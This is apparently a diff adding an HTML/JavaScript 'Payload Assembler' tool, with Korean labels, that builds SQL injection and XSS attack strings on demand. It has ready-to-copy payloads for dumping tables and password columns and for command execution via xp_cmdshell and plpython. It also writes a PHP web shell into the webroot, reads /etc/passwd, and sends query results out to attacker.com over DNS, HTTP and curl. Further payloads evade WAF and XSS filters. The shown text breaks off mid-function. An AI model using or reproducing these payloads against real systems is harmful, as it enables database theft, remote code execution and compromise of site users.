@@ -1,0 +1,648 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Payload Assembler</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { min-height: 100vh; background: #0d1117; color: #e6edf3; font-family: 'Segoe UI', sans-serif; padding: 2rem 1rem; }
+    header { display: flex; align-items: center; gap: 1rem; max-width: 1200px; margin: 0 auto 2rem; }
+    header a { color: #8b949e; text-decoration: none; font-size: 0.9rem; }
+    header a:hover { color: #58a6ff; }
+    h1 { font-size: 1.6rem; color: #58a6ff; }
+    .container { max-width: 1200px; margin: 0 auto; }
+
+    .type-tabs { display: flex; gap: 0.5rem; margin-bottom: 1.5rem; }
+    .tab { padding: 0.5rem 1.5rem; border-radius: 8px; border: 1px solid #30363d; background: #161b22;
+           color: #8b949e; cursor: pointer; font-size: 0.9rem; font-weight: 600; transition: all 0.2s; }
+    .tab.active { background: #1f6feb; border-color: #1f6feb; color: #fff; }
+    .tab:hover:not(.active) { border-color: #58a6ff; color: #58a6ff; }
+
+    .grid { display: grid; grid-template-columns: 320px 1fr; gap: 1.5rem; }
+    @media (max-width: 800px) { .grid { grid-template-columns: 1fr; } }
+
+    .panel { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 1.5rem; }
+    .panel h2 { font-size: 1rem; color: #8b949e; margin-bottom: 1.2rem; padding-bottom: 0.75rem; border-bottom: 1px solid #30363d; }
+    .form-group { margin-bottom: 1rem; }
+    label { display: block; font-size: 0.8rem; color: #8b949e; margin-bottom: 0.4rem; }
+    select, input[type=text] { width: 100%; background: #0d1117; border: 1px solid #30363d; border-radius: 8px;
+      color: #e6edf3; font-size: 0.9rem; padding: 0.55rem 0.75rem; outline: none; transition: border-color 0.2s; }
+    select:focus, input:focus { border-color: #58a6ff; }
+    .check-group { display: flex; flex-direction: column; gap: 0.4rem; }
+    .check-item { display: flex; align-items: center; gap: 0.5rem; font-size: 0.85rem; cursor: pointer; }
+    .check-item input[type=checkbox] { accent-color: #58a6ff; width: 14px; height: 14px; }
+
+    button { padding: 0.5rem 1.2rem; border-radius: 8px; border: none; cursor: pointer; font-size: 0.9rem; font-weight: 600; transition: opacity 0.2s; }
+    button:hover { opacity: 0.85; }
+    .btn-gen  { background: #1f6feb; color: #fff; width: 100%; margin-top: 1rem; }
+    .btn-copy { background: #30363d; color: #e6edf3; font-size: 0.8rem; padding: 0.3rem 0.7rem; }
+
+    .result-section { margin-bottom: 1.5rem; }
+    .result-section h3 { font-size: 0.9rem; color: #8b949e; margin-bottom: 0.75rem; }
+
+    .feasibility-bar { display: flex; gap: 0.75rem; flex-wrap: wrap; margin-bottom: 1.2rem; }
+    .feas-badge { padding: 0.4rem 1rem; border-radius: 20px; font-size: 0.82rem; font-weight: 600; }
+    .feas-yes  { background: #1a2d1a; color: #3fb950; border: 1px solid #3fb950; }
+    .feas-no   { background: #3d1a1a; color: #f85149; border: 1px solid #f85149; }
+    .feas-maybe{ background: #2d1f00; color: #d29922; border: 1px solid #d29922; }
+
+    .payload-card {
+      background: #0d1117; border: 1px solid #30363d; border-radius: 8px;
+      padding: 0.75rem 1rem; margin-bottom: 0.6rem;
+    }
+    .payload-card:hover { border-color: #58a6ff; }
+    .payload-header { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 0.4rem; }
+    .payload-title { font-size: 0.82rem; color: #8b949e; }
+    code.payload-code { display: block; font-family: 'Courier New', monospace; font-size: 0.83rem;
+      color: #79c0ff; word-break: break-all; margin: 0.35rem 0; }
+    .payload-note { font-size: 0.75rem; color: #8b949e; }
+
+    .warn-box { background: #2d1f00; border: 1px solid #d29922; border-radius: 8px; padding: 0.75rem 1rem;
+      font-size: 0.82rem; color: #d29922; margin-bottom: 1rem; }
+    .info-box { background: #1a2535; border: 1px solid #1f6feb; border-radius: 8px; padding: 0.75rem 1rem;
+      font-size: 0.82rem; color: #79c0ff; margin-bottom: 1rem; }
+
+    .section-hidden { display: none; }
+    .count-badge { display: inline-block; background: #1f6feb; color: #fff; border-radius: 20px; font-size: 0.75rem; padding: 0.15rem 0.6rem; margin-left: 0.5rem; }
+
+    .divider { border: none; border-top: 1px solid #30363d; margin: 1.2rem 0; }
+  </style>
+</head>
+<body>
+  <header>
+    <a href="index.html">← 홈</a>
+    <h1>Payload Assembler</h1>
+  </header>
+
+  <div class="container">
+    <div class="type-tabs">
+      <div class="tab active" onclick="switchType('sqli')">SQL Injection</div>
+      <div class="tab" onclick="switchType('xss')">XSS</div>
+    </div>
+
+    <!-- SQLi Section -->
+    <div id="sqli-section">
+      <div class="grid">
+        <div class="panel">
+          <h2>SQLi 설정</h2>
+
+          <div class="form-group">
+            <label>DB 타입</label>
+            <select id="sq-db">
+              <option value="mysql">MySQL / MariaDB</option>
+              <option value="mssql">MSSQL (SQL Server)</option>
+              <option value="oracle">Oracle</option>
+              <option value="postgres">PostgreSQL</option>
+              <option value="sqlite">SQLite</option>
+            </select>
+          </div>
+
+          <div class="form-group">
+            <label>인젝션 기법</label>
+            <select id="sq-tech">
+              <option value="union">UNION-based</option>
+              <option value="error">Error-based</option>
+              <option value="boolean">Boolean-based Blind</option>
+              <option value="time">Time-based Blind</option>
+              <option value="stacked">Stacked Queries</option>
+              <option value="oob">Out-of-Band (DNS/HTTP)</option>
+            </select>
+          </div>
+
+          <div class="form-group">
+            <label>삽입 위치</label>
+            <select id="sq-point">
+              <option value="string">String (문자열 파라미터)</option>
+              <option value="integer">Integer (숫자 파라미터)</option>
+              <option value="search">LIKE 검색</option>
+              <option value="order">ORDER BY</option>
+              <option value="insert">INSERT INTO</option>
+            </select>
+          </div>
+
+          <div class="form-group">
+            <label>목표</label>
+            <select id="sq-goal">
+              <option value="version">DB 버전 추출</option>
+              <option value="dbname">현재 DB 이름</option>
+              <option value="tables">테이블 목록</option>
+              <option value="columns">컬럼 목록</option>
+              <option value="dump">데이터 덤프</option>
+              <option value="rce">OS 명령 실행 (RCE)</option>
+              <option value="file">파일 읽기/쓰기</option>
+            </select>
+          </div>
+
+          <div class="form-group">
+            <label>필터 / WAF 우회</label>
+            <div class="check-group">
+              <label class="check-item"><input type="checkbox" id="sq_f_space"> 공백 필터 우회</label>
+              <label class="check-item"><input type="checkbox" id="sq_f_comment"> 주석 우회</label>
+              <label class="check-item"><input type="checkbox" id="sq_f_case"> 대소문자 우회</label>
+              <label class="check-item"><input type="checkbox" id="sq_f_encode"> 인코딩 우회</label>
+              <label class="check-item"><input type="checkbox" id="sq_f_concat"> 문자열 연결 우회</label>
+            </div>
+          </div>
+
+          <div class="form-group">
+            <label>커스텀 테이블 / 컬럼 이름 (선택)</label>
+            <input type="text" id="sq-table" placeholder="users">
+            <input type="text" id="sq-column" placeholder="password" style="margin-top:0.4rem">
+          </div>
+
+          <button class="btn-gen" onclick="generateSQLi()">페이로드 생성</button>
+        </div>
+
+        <div class="panel" id="sqli-results">
+          <h2>결과</h2>
+          <div style="color:#8b949e;font-style:italic;text-align:center;padding:3rem">설정을 선택하고 "페이로드 생성"을 클릭하세요.</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- XSS Module Section -->
+    <div id="xss-section" class="section-hidden">
+      <div class="grid">
+        <div class="panel">
+          <h2>XSS 모듈 설정</h2>
+
+          <div class="form-group">
+            <label>Reflection 타입</label>
+            <select id="xs-ref">
+              <option value="reflected">Reflected XSS</option>
+              <option value="stored">Stored XSS</option>
+              <option value="dom">DOM-based XSS</option>
+            </select>
+          </div>
+
+          <div class="form-group">
+            <label>입력 컨텍스트</label>
+            <select id="xs-ctx">
+              <option value="html_body">HTML Body</option>
+              <option value="attr_dq">속성값 (쌍따옴표)</option>
+              <option value="attr_sq">속성값 (홑따옴표)</option>
+              <option value="js_str">JS 문자열</option>
+              <option value="js_template">JS 템플릿 리터럴</option>
+              <option value="url">URL href/src</option>
+            </select>
+          </div>
+
+          <div class="form-group">
+            <label>DOM Sink (DOM XSS인 경우)</label>
+            <select id="xs-sink">
+              <option value="none">해당 없음</option>
+              <option value="innerhtml">innerHTML</option>
+              <option value="document_write">document.write</option>
+              <option value="eval">eval / Function</option>
+              <option value="location">location.href / location</option>
+              <option value="src">element.src</option>
+              <option value="jquery_html">jQuery .html()</option>
+              <option value="angular_template">AngularJS template</option>
+            </select>
+          </div>
+
+          <div class="form-group">
+            <label>필터</label>
+            <div class="check-group">
+              <label class="check-item"><input type="checkbox" id="xs_f_script"> &lt;script&gt; 차단</label>
+              <label class="check-item"><input type="checkbox" id="xs_f_onerror"> on이벤트 차단</label>
+              <label class="check-item"><input type="checkbox" id="xs_f_alert"> alert 키워드 차단</label>
+              <label class="check-item"><input type="checkbox" id="xs_f_proto"> javascript: 차단</label>
+              <label class="check-item"><input type="checkbox" id="xs_f_angle"> &lt;&gt; 차단</label>
+              <label class="check-item"><input type="checkbox" id="xs_f_quote"> 따옴표 차단</label>
+            </div>
+          </div>
+
+          <button class="btn-gen" onclick="generateXSSModule()">페이로드 생성</button>
+        </div>
+
+        <div class="panel" id="xss-results">
+          <h2>결과</h2>
+          <div style="color:#8b949e;font-style:italic;text-align:center;padding:3rem">설정을 선택하고 "페이로드 생성"을 클릭하세요.</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    function switchType(t) {
+      document.querySelectorAll('.tab').forEach((el, i) => el.classList.toggle('active', (t==='sqli'&&i===0)||(t==='xss'&&i===1)));
+      document.getElementById('sqli-section').style.display = t === 'sqli' ? '' : 'none';
+      document.getElementById('xss-section').classList.toggle('section-hidden', t !== 'xss');
+    }
+
+    // ---------- SQLi ----------
+    const SQLI = {
+      version: {
+        mysql:    ['SELECT @@version', 'SELECT version()'],
+        mssql:    ['SELECT @@version'],
+        oracle:   ['SELECT banner FROM v$version WHERE ROWNUM=1', "SELECT version FROM v$instance"],
+        postgres: ['SELECT version()'],
+        sqlite:   ['SELECT sqlite_version()'],
+      },
+      dbname: {
+        mysql:    ['SELECT database()', 'SELECT schema()'],
+        mssql:    ['SELECT DB_NAME()'],
+        oracle:   ['SELECT global_name FROM global_name', 'SELECT ora_database_name FROM dual'],
+        postgres: ['SELECT current_database()'],
+        sqlite:   ['SELECT name FROM sqlite_master WHERE type="table" LIMIT 1'],
+      },
+      tables: {
+        mysql:    ["SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()"],
+        mssql:    ["SELECT STRING_AGG(name,',') FROM sysobjects WHERE xtype='U'"],
+        oracle:   ["SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM all_tables WHERE owner=user"],
+        postgres: ["SELECT string_agg(tablename,',') FROM pg_tables WHERE schemaname='public'"],
+        sqlite:   ["SELECT group_concat(name) FROM sqlite_master WHERE type='table'"],
+      },
+      columns: {
+        mysql:    ["SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='{table}'"],
+        mssql:    ["SELECT STRING_AGG(name,',') FROM sys.columns WHERE object_id=OBJECT_ID('{table}')"],
+        oracle:   ["SELECT LISTAGG(column_name,',') WITHIN GROUP (ORDER BY column_name) FROM all_tab_columns WHERE table_name=UPPER('{table}')"],
+        postgres: ["SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='{table}'"],
+        sqlite:   ["SELECT group_concat(name) FROM pragma_table_info('{table}')"],
+      },
+      dump: {
+        mysql:    ["SELECT group_concat({column} SEPARATOR 0x7c) FROM {table}", "SELECT {column} FROM {table} LIMIT 1"],
+        mssql:    ["SELECT STRING_AGG({column},'|') FROM {table}"],
+        oracle:   ["SELECT LISTAGG({column},'|') WITHIN GROUP (ORDER BY 1) FROM {table}"],
+        postgres: ["SELECT string_agg({column}::text,'|') FROM {table}"],
+        sqlite:   ["SELECT group_concat({column}) FROM {table}"],
+      },
+      rce: {
+        mysql:    ["-- MySQL RCE requires FILE privilege + INTO OUTFILE to webroot\n-- or UDF (User Defined Function) exploitation"],
+        mssql:    ["EXEC xp_cmdshell 'whoami'", "EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;"],
+        oracle:   ["-- Oracle RCE via JAVA: EXEC DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper c:\\windows\\system32\\cmd.exe /c whoami')"],
+        postgres: ["COPY (SELECT '') TO PROGRAM 'cmd /c whoami'", "CREATE OR REPLACE FUNCTION sys(text) RETURNS text AS $$ import os; return os.popen($1).read() $$ LANGUAGE plpythonu"],
+        sqlite:   ["-- SQLite RCE: 일반적으로 불가, load_extension() 활성화 필요"],
+      },
+      file: {
+        mysql:    ["SELECT LOAD_FILE('/etc/passwd')", "SELECT '<?php system($_GET[cmd]);?>' INTO OUTFILE '/var/www/html/shell.php'"],
+        mssql:    ["BULK INSERT table FROM 'c:\\windows\\system32\\drivers\\etc\\hosts' WITH (ROWTERMINATOR='\\n')"],
+        oracle:   ["SELECT * FROM OPENROWSET(BULK 'C:\\inetpub\\wwwroot\\web.config', SINGLE_CLOB) AS x"],
+        postgres: ["COPY table FROM '/etc/passwd'", "COPY (SELECT '') TO '/tmp/test.txt'"],
+        sqlite:   ["-- SQLite 파일 읽기: attach database '/etc/passwd' as r; select * from r.sqlite_master;"],
+      },
+    };
+
+    // Union column count probing starters
+    const UNION_PROBES = {
+      string:  ["' ORDER BY 1--", "' ORDER BY 2--", "' ORDER BY 3--", "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--"],
+      integer: ["1 ORDER BY 1--", "1 ORDER BY 2--", "1 ORDER BY 3--", "1 UNION SELECT NULL--", "1 UNION SELECT NULL,NULL--"],
+      search:  ["% ORDER BY 1--", "% UNION SELECT NULL--", "% UNION SELECT NULL,NULL--"],
+      order:   ["1-- -", "1 ASC-- -", "(SELECT 1 WHERE 1=1)-- -"],
+      insert:  ["'),('1','2'),('3"],
+    };
+
+    function sqliWrap(payload, tech, point, db, filters) {
+      const fSpace   = filters.space;
+      const fComment = filters.comment;
+      const fCase    = filters.caseBypass;
+      const fConcat  = filters.concat;
+
+      let prefix = '', suffix = '--';
+      if (point === 'string') { prefix = "'"; suffix = "--"; }
+      if (point === 'integer') { prefix = ""; suffix = "--"; }
+      if (point === 'search') { prefix = "%'"; suffix = "--"; }
+      if (point === 'order') { prefix = ""; suffix = "--"; }
+
+      let s = payload;
+      if (fSpace)   s = s.replace(/ /g, '/**/ ').replace(/\/\*\*\/ /g, '/**/');
+      if (fComment) suffix = '-- -';
+      if (fCase)    s = s.replace(/select/gi,'SeLeCt').replace(/union/gi,'UnIoN').replace(/from/gi,'FrOm').replace(/where/gi,'WhErE');
+
+      return `${prefix} ${s} ${suffix}`;
+    }
+
+    function generateSQLi() {
+      const db     = document.getElementById('sq-db').value;
+      const tech   = document.getElementById('sq-tech').value;
+      const point  = document.getElementById('sq-point').value;
+      const goal   = document.getElementById('sq-goal').value;
+      const table  = document.getElementById('sq-table').value || 'users';
+      const column = document.getElementById('sq-column').value || 'password';
+
+      const filters = {
+        space:   document.getElementById('sq_f_space').checked,
+        comment: document.getElementById('sq_f_comment').checked,
+        caseBypass: document.getElementById('sq_f_case').checked,
+        encode:  document.getElementById('sq_f_encode').checked,
+        concat:  document.getElementById('sq_f_concat').checked,
+      };
+
+      const panel = document.getElementById('sqli-results');
+
+      // Feasibility check
+      const feasibility = getFeasibility(db, tech, goal, filters);
+
+      // Get raw payloads
+      const rawPayloads = (SQLI[goal]?.[db] || ['-- 이 DB에서 지원되지 않는 기법']).map(p =>
+        p.replace('{table}', table).replace('{column}', column)
+      );
+
+      // Union column probes
+      const probes = tech === 'union' ? UNION_PROBES[point] || [] : [];
+
+      // Assembly
+      let assembled = [];
+
+      if (tech === 'union') {
+        probes.forEach(p => assembled.push({ title: '컬럼 수 탐색', code: p, note: '컬럼 수를 하나씩 늘려가며 오류 없는 수를 찾음' }));
+        rawPayloads.forEach(p => {
+          const wrapped = sqliWrap(`UNION SELECT ${p},NULL`, tech, point, db, filters);
+          assembled.push({ title: `UNION ${goal}`, code: wrapped, note: `컬럼 수에 맞게 NULL 수 조정 필요` });
+        });
+      } else if (tech === 'error') {
+        const errorFns = {
+          mysql:    p => `AND extractvalue(1,concat(0x7e,(${p})))`,
+          mssql:    p => `AND 1=CONVERT(int,(${p}))`,
+          oracle:   p => `AND 1=CTXSYS.DRITHSX.SN(user,(${p}))`,
+          postgres: p => `AND 1=CAST((${p}) AS int)`,
+          sqlite:   p => `AND typeof((${p})) = 'integer'`,
+        };
+        rawPayloads.forEach(p => {
+          const fn = errorFns[db] || (q => `AND 1=(${q})`);
+          const wrapped = sqliWrap(fn(p), tech, point, db, filters);
+          assembled.push({ title: `Error-based ${goal}`, code: wrapped, note: '오류 메시지에서 데이터 추출' });
+        });
+      } else if (tech === 'boolean') {
+        rawPayloads.forEach(p => {
+          const trueCase  = sqliWrap(`AND (${p}) LIKE '%a%'`, tech, point, db, filters);
+          const falseCase = sqliWrap(`AND (${p}) LIKE '%z%'`, tech, point, db, filters);
+          assembled.push({ title: `Boolean TRUE  — ${goal}`, code: trueCase, note: '응답 차이로 한 글자씩 추출' });
+          assembled.push({ title: `Boolean FALSE — ${goal}`, code: falseCase, note: '응답이 달라지는 지점에서 문자 확인' });
+          assembled.push({ title: `Boolean SUBSTR`, code: sqliWrap(`AND SUBSTRING((${p}),1,1)='a'`, tech, point, db, filters), note: 'SUBSTRING으로 첫 글자 비교' });
+        });
+      } else if (tech === 'time') {
+        const sleepFns = {
+          mysql:    p => `AND SLEEP(5) AND (SELECT 1 FROM (${p}) t)=(SELECT 1 FROM (${p}) t)`,
+          mssql:    p => `IF(1=1) WAITFOR DELAY '0:0:5'`,
+          oracle:   p => `AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)`,
+          postgres: p => `AND (SELECT pg_sleep(5) FROM (${p}) t) IS NOT NULL`,
+          sqlite:   p => `AND (SELECT RANDOMBLOB(100000000) FROM (${p}) t) IS NOT NULL`,
+        };
+        rawPayloads.forEach(p => {
+          const fn = sleepFns[db] || (q => `AND SLEEP(5)`);
+          assembled.push({ title: `Time-based ${goal}`, code: sqliWrap(fn(p), tech, point, db, filters), note: '5초 지연 발생 여부로 참/거짓 판단' });
+        });
+        assembled.push({ title: 'Time-based 기본 확인', code: sqliWrap(sleepFns[db]?.('') || 'AND SLEEP(5)', tech, point, db, filters), note: '인젝션 가능 여부 기본 확인용' });
+      } else if (tech === 'stacked') {
+        rawPayloads.forEach(p => {
+          assembled.push({ title: `Stacked ${goal}`, code: sqliWrap(`; ${p}--`, tech, point, db, filters), note: 'Stacked query (세미콜론 이후 별도 쿼리 실행)' });
+        });
+      } else if (tech === 'oob') {
+        const oobFns = {
+          mysql:    p => `AND LOAD_FILE(concat('\\\\\\\\',( ${p} ),'.attacker.com\\\\a'))`,
+          mssql:    p => `; EXEC master..xp_dirtree '\\\\'+( ${p} )+'.attacker.com\\share'--`,
+          oracle:   p => `AND (SELECT UTL_HTTP.REQUEST('http://attacker.com/?x='||( ${p} )) FROM dual) IS NOT NULL`,
+          postgres: p => `; COPY (SELECT ( ${p} )) TO PROGRAM 'curl http://attacker.com/?x='||( ${p} )`,
+          sqlite:   p => `-- SQLite OOB 불가`,
+        };
+        rawPayloads.forEach(p => {
+          const fn = oobFns[db] || (q => `-- OOB not supported`);
+          assembled.push({ title: `OOB DNS ${goal}`, code: sqliWrap(fn(p), tech, point, db, filters), note: 'attacker.com을 자신의 Burp Collaborator/interactsh URL로 교체' });
+        });
+      }
+
+      // Filter bypass variants
+      if (filters.encode) {
+        const base = assembled[assembled.length - 1];
+        if (base) {
+          assembled.push({
+            title: `${base.title} (URL 인코딩)`,
+            code: encodeURIComponent(base.code),
+            note: 'URL 인코딩 버전 (파라미터 직접 삽입 시 사용)'
+          });
+        }
+      }
+
+      if (filters.concat) {
+        const concatMap = {
+          mysql: ["CONCAT(0x61,0x62)", "GROUP_CONCAT(col ORDER BY col SEPARATOR 0x7c)"],
+          mssql: ["'a'+'b'", "CHAR(65)+CHAR(66)"],
+          oracle: ["'a'||'b'", "CHR(65)||CHR(66)"],
+          postgres: ["'a'||'b'", "CHR(65)||CHR(66)"],
+          sqlite: ["'a'||'b'"],
+        };
+        (concatMap[db] || []).forEach(ex => {
+          assembled.push({ title: '문자열 연결 우회 예시', code: ex, note: '문자열 필터 우회를 위한 연결 방법' });
+        });
+      }
+
+      // Render
+      panel.innerHTML = `
+        <h2>결과</h2>
+        <div class="feasibility-bar">
+          <span class="feas-badge feas-${feasibility.possible}">${feasibility.possible === 'yes' ? '✓ 실행 가능' : feasibility.possible === 'no' ? '✗ 불가능/어려움' : '△ 조건부 가능'}</span>
+          ${feasibility.notes.map(n => `<span class="feas-badge feas-maybe">${n}</span>`).join('')}
+        </div>
+        ${feasibility.warn ? `<div class="warn-box">${feasibility.warn}</div>` : ''}
+        ${feasibility.info ? `<div class="info-box">${feasibility.info}</div>` : ''}
+        <div class="result-section">
+          <h3>조립된 페이로드 <span class="count-badge">${assembled.length}</span></h3>
+          ${assembled.map((a, i) => `
+            <div class="payload-card">
+              <div class="payload-header">
+                <span class="payload-title">${a.title}</span>
+                <button class="btn-copy" onclick="copySQLi(${i})">Copy</button>
+              </div>
+              <code class="payload-code">${escHtml(a.code)}</code>
+              <div class="payload-note">${a.note}</div>
+            </div>
+          `).join('')}
+        </div>
+      `;
+      window._sqliPayloads = assembled;
+    }
+
+    function getFeasibility(db, tech, goal, filters) {
+      const notes = [];
+      let possible = 'yes';
+      let warn = '', info = '';
+
+      if (tech === 'stacked') {
+        if (db === 'mysql' || db === 'sqlite') { possible = 'maybe'; warn = `${db === 'mysql' ? 'MySQL' : 'SQLite'}: Stacked query는 PHP mysqli_multi_query() 등 다중 쿼리 지원 API에서만 가능`; }
+        if (db === 'oracle') { possible = 'no'; warn = 'Oracle은 일반적으로 Stacked Query 미지원'; }
+      }
+      if (tech === 'oob') {
+        if (db === 'mysql') { notes.push('FILE 권한 필요'); warn = 'MySQL OOB: secure_file_priv 설정 및 FILE 권한 필요. 클라우드 DB에서는 거의 불가.'; }
+        if (db === 'postgres') { notes.push('SUPERUSER 필요'); }
+        if (db === 'sqlite') { possible = 'no'; warn = 'SQLite OOB 거의 불가능'; }
+      }
+      if (goal === 'rce') {
+        if (db === 'mysql') { possible = 'maybe'; warn = 'MySQL RCE: UDF 사용 또는 특수 조건 필요 (높은 권한, secure_file_priv 비활성화)'; }
+        if (db === 'sqlite') { possible = 'no'; warn = 'SQLite RCE: load_extension 허용 시만 가능, 기본 비활성화'; }
+        if (db === 'mssql') { notes.push('xp_cmdshell 활성화 필요'); }
+        if (db === 'postgres') { notes.push('plpython 필요'); }
+        if (db === 'oracle') { possible = 'maybe'; notes.push('JAVA 권한 필요'); }
+      }
+      if (goal === 'file') {
+        if (db === 'mysql') { notes.push('FILE 권한, secure_file_priv'); }
+        if (db === 'sqlite') { info = 'SQLite 파일 읽기: attach database 방법 사용 가능 (조건부)'; possible = 'maybe'; }
+      }
+      if (tech === 'union' && filters.space) notes.push('/**/로 공백 우회');
+      if (filters.caseBypass) notes.push('대소문자 혼합');
+
+      return { possible, notes, warn, info };
+    }
+
+    function copySQLi(i) {
+      navigator.clipboard.writeText(window._sqliPayloads[i].code).then(() => showToast());
+    }
+
+    // ---------- XSS Module ----------
+    function generateXSSModule() {
+      const ref  = document.getElementById('xs-ref').value;
+      const ctx  = document.getElementById('xs-ctx').value;
+      const sink = document.getElementById('xs-sink').value;
+
+      const fScript = document.getElementById('xs_f_script').checked;
+      const fOnEvt  = document.getElementById('xs_f_onerror').checked;
+      const fAlert  = document.getElementById('xs_f_alert').checked;
+      const fProto  = document.getElementById('xs_f_proto').checked;
+      const fAngle  = document.getElementById('xs_f_angle').checked;
+      const fQuote  = document.getElementById('xs_f_quote').checked;
+
+      const js = fAlert ? 'confirm(1)' : 'alert(1)';
+      const payloads = [];
+
+      const add = (title, code, note) => payloads.push({ title, code, note });
+
+      // Feasibility
+      let feasWarn = '';
+      if (fAngle && (ctx === 'html_body' || ctx === 'attr_dq' || ctx === 'attr_sq')) {
+        feasWarn = '꺾쇠(&lt;&gt;) 필터 활성화 → HTML 컨텍스트 탈출 불가, 동일 태그 내 속성 이벤트 방법 시도 필요';
+      }
+      if (fScript && fOnEvt && fProto) {
+        feasWarn += (feasWarn ? '<br>' : '') + 'script + 이벤트 + javascript: 모두 차단 → 매우 제한적, AngularJS/template injection 고려';
+      }
+
+      // DOM sink specific
+      if (sink === 'innerhtml') {
+        add('innerHTML 직접 삽입', `<img src=x onerror=${js}>`, 'innerHTML은 script 태그를 실행하지 않으므로 이벤트 속성 사용');
+        add('innerHTML SVG', `<svg onload=${js}>`, 'SVG 이벤트 활용');
+        if (!fScript) add('innerHTML — script (구형 브라우저)', `<script>${js}<\/script>`, 'IE 등 구형 브라우저에서는 innerHTML script 실행 가능');
+      }
+      if (sink === 'document_write') {
+        add('document.write', `<script>${js}<\/script>`, 'document.write는 script 태그 실행 가능');
+        add('document.write 이벤트', `<img src=x onerror=${js}>`, '이벤트 핸들러 방식');
+      }
+      if (sink === 'eval') {
+        add('eval sink', js, 'eval에 직접 삽입');
+        add('eval — Function', `}; ${js}; var x = function(){`, '함수 탈출 후 삽입');
+      }
+      if (sink === 'location') {
+        if (!fProto) add('location.href', `javascript:${js}`, 'javascript: 프로토콜');
+        add('location hash', `#<img src=x onerror=${js}>`, 'hash 기반 DOM XSS');
+      }
+      if (sink === 'jquery_html') {
+        add('jQuery .html()', `<img src=x onerror=${js}>`, '.html()은 innerHTML과 동일하게 script 실행 안 함');
+        add('jQuery .html() script', `<script>${js}<\/script>`, 'jQuery는 script를 실행할 수 있음 (버전에 따라 다름)');
+      }
+      if (sink === 'angular_template') {
+        add('AngularJS v1', `{{constructor.constructor('${js}')()}}`, 'AngularJS template injection');
+        add('AngularJS $on', `{{$on.constructor('${js}')()}}`, '$on 방법');
+      }
+
+      // Context-based
+      if (ctx === 'html_body') {
+        if (!fScript && !fAngle) add('script 태그', `<script>${js}<\/script>`, '기본');
+        if (!fAngle) {
+          add('img onerror', `<img src=x onerror=${js}>`, '기본 이벤트');
+          add('svg onload', `<svg onload=${js}>`, 'SVG 이벤트');
+          if (fScript || fOnEvt) {
+            add('details ontoggle', `<details open ontoggle=${js}>`, 'script/onerror 대체');
+            add('iframe srcdoc', `<iframe srcdoc="<script>${js}<\/script>">`, 'srcdoc 속성 활용');
+          }
+        }
+        if (fAngle) {
+          add('엔티티 삽입 (제한적)', `&lt;img src=x onerror=${js}&gt;`, '이미 HTML 파싱 후라면 실행 가능');
+        }
+      }
+
+      if (ctx === 'attr_dq') {
+        if (!fAngle && !fQuote) add('태그 탈출', `"><img src=x onerror=${js}>`, '따옴표 + 꺾쇠 탈출');
+        if (!fQuote) {
+          if (!fOnEvt) add('이벤트 삽입', `" onerror="${js}" x="`, '같은 태그 내 이벤트');
+          if (fOnEvt && !fAngle) add('새 태그 삽입', `"><svg onload=${js}>`, 'onerror 대신 svg');
+        }
+        if (fQuote) add('따옴표 우회 — HTML 엔티티', `&quot; onerror=&quot;${js}&quot; x=&quot;`, 'HTML 엔티티 (속성 내 렌더링 후)');
+      }
+
+      if (ctx === 'attr_sq') {
+        if (!fAngle && !fQuote) add('태그 탈출', `'><img src=x onerror=${js}>`, '홑따옴표 탈출');
+        if (!fQuote && !fOnEvt) add('이벤트 삽입', `' onerror='${js}' x='`, '같은 태그 이벤트');
+      }
+
+      if (ctx === 'js_str') {
+        add('문자열 탈출', `"-${js}-"`, '따옴표 탈출 후 JS 삽입');
+        add('세미콜론 탈출', `";${js};//`, '다음 문장으로 삽입');
+        if (!fAngle) add('HTML 태그 삽입', `"<\/script><script>${js}<\/script>"`, 'script 블록 탈출');
+        if (fAlert) add('confirm 대체', `";confirm\`1\`;//`, 'alert 대신 confirm + template literal');
+      }
+
+      if (ctx === 'js_template') {
+        add('표현식 삽입', `\${${js}}`, '직접 표현식 삽입');
+        add('템플릿 탈출', `\`;\`; ${js} //`, '백틱 탈출');
+      }
+
+      if (ctx === 'url') {
+        if (!fProto) {
+          add('javascript: URI', `javascript:${js}`, 'href/src에 삽입');
+          add('javascript: 대소문자', `JaVaScRiPt:${js}`, '대소문자 필터 우회');
+          add('javascript: 탭 삽입', `java\tscript:${js}`, 'Tab 삽입 우회');
+        }
+        add('data: URI', `data:text/html,<script>${js}<\/script>`, 'data: URI (iframe src 등)');
+      }
+
+      // Render
+      const panel = document.getElementById('xss-results');
+
+      panel.innerHTML = `
+        <h2>결과</h2>
+        ${feasWarn ? `<div class="warn-box">${feasWarn}</div>` : ''}
+        <div class="info-box">
+          Reflection: <strong>${ref}</strong> | Context: <strong>${ctx}</strong> | Sink: <strong>${sink}</strong>
+          | JS: <code style="font-family:monospace">${escHtml(js)}</code>
+        </div>
+        <div class="result-section">
+          <h3>조립된 페이로드 <span class="count-badge">${payloads.length}</span></h3>
+          ${payloads.length === 0 ? '<div style="color:#8b949e;font-style:italic;padding:1rem">현재 필터 설정으로 실행 가능한 페이로드를 생성할 수 없습니다.<br>필터 완화 또는 다른 컨텍스트를 시도하세요.</div>' :
+          payloads.map((p, i) => `
+            <div class="payload-card">
+              <div class="payload-header">
+                <span class="payload-title">${p.title}</span>
+                <button class="btn-copy" onclick="copyXSS(${i})">Copy</button>
+              </div>
+              <code class="payload-code">${escHtml(p.code)}</code>
+              <div class="payload-note">${p.note}</div>
+            </div>
+          `).join('')}
+        </div>
+      `;
+      window._xssPayloads = payloads;
+    }
+
+    function copyXSS(i) {
+      navigator.clipboard.writeText(window._xssPayloads[i].code).then(() => showToast());
+    }
+
+    function escHtml(s) {
